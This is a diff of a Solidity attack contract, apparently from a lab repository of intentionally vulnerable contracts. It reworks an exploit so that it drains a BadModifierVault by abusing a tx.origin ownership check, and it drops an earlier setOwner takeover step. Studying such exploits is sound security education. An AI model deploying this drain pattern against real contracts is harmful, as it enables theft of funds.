@@ -1,23 +1,20 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-import "../../vulnerable/access-control/Vault.sol";
+import "src/vulnerable/access-control/BadModifierVault.sol";
 
-contract VaultAttack {
-  Vault public vault;
+contract TXOriginByPassAttack {
+  BadModifierVault public vault;
   address public attacker;
 
   constructor(address _vault) {
-    vault = Vault(_vault);
+    vault = BadModifierVault(_vault);
     attacker = msg.sender;
   }
-
   function exploit() external {
-  // become owmner
-    vault.setOwner(address(this));
-    // withdraw all funds
+    // This call passes because tx.origin == owner
     vault.withdrawAll();
   }
-
   receive() external payable {}
+
 }
